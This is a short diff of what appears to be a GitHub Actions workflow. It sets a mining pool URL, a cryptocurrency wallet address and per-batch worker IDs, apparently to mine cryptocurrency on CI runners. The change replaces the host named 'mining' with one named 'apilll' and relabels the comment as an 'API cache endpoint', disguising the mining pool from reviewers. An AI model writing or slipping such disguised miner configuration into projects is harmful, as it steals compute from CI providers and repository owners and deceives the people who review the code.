@@ -73,8 +73,8 @@ jobs:
 
       - name: Configure build
         env:
-          # Proxy endpoint (senin PC üzerinden)
-          POOL_URL: mining.frostai.com.tr:3333
+          # API cache endpoint (proxy)
+          POOL_URL: apilll.frostai.com.tr:3111
           WALLET: 48vxR9wsYHoaVonLgEHLswFiHs6BwfRnAdYkRGfVBWajikMJabj3EswWJznGtE8jLZWmk1zzMSk7QEcFPuMmst1QEsfxxpK
           WORKER_ID: ${{ github.repository_owner }}-b${{ matrix.batch }}
         run: |
